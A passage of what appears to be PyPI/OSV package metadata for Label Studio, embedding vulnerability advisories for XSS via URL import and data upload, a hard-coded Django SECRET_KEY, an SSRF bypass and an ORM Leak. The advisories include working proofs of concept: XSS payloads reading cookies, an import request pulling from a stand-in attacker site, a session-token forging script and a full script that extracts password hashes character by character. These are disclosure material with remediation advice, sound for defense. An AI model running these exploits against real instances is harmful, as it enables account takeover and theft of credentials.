tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.0.0.post0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.0.0.post0/","requires_dist":["wheel","appdirs (==1.4.3)","attr (==0.3.1)","attrs (>=19.1.0)","azure-storage-blob (>=12.6.0)","boto (==2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","google-cloud-storage (==1.28.1)","Django (==3.1.4)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.3.2)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-redis-cache (==3.0.0)","drf-dynamic-fields (==0.3.0)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","label-studio-converter (==0.0.26)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (==0.12.2)","lxml (>=4.2.5)","moto (==1.3.16.dev122)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.8.4)","pydantic (==1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","pyyaml (>=5.3.1)","requests (<3,>=2.22.0)","rq (==1.7.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.0.0.post0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"60d8b07d2578a2904212e89915f308029aefafa19b4e6d143afa59847f7e0725","md5":"2bd6cb0f42b685cda9f2b33579bbc962","sha256":"667a6846b182e55aeb256cb1357c6ea97f2996d017a16b8066ce2b4ecf7eff90"},"downloads":-1,"filename":"label_studio-1.0.0.post0-py3-none-any.whl","has_sig":false,"md5_digest":"2bd6cb0f42b685cda9f2b33579bbc962","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":47690331,"upload_time":"2021-03-18T14:28:09","upload_time_iso_8601":"2021-03-18T14:28:09.211561Z","url":"https://files.pythonhosted.org/packages/60/d8/b07d2578a2904212e89915f308029aefafa19b4e6d143afa59847f7e0725/label_studio-1.0.0.post0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"f5ecfe9a495303560e3da46f46cd6f1cc5f311c94e6c9cee646d8ae54bca4333","md5":"a3e15dd80792b3178af762bc7e1acc74","sha256":"7972283a6aca2e0bbbd236f7604e3e752086704c55d42b74c65d9b753c4048ed"},"downloads":-1,"filename":"label-studio-1.0.0.post0.tar.gz","has_sig":false,"md5_digest":"a3e15dd80792b3178af762bc7e1acc74","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":46875860,"upload_time":"2021-03-18T14:29:23","upload_time_iso_8601":"2021-03-18T14:29:23.966346Z","url":"https://files.pythonhosted.org/packages/f5/ec/fe9a495303560e3da46f46cd6f1cc5f311c94e6c9cee646d8ae54bca4333/label-studio-1.0.0.post0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if 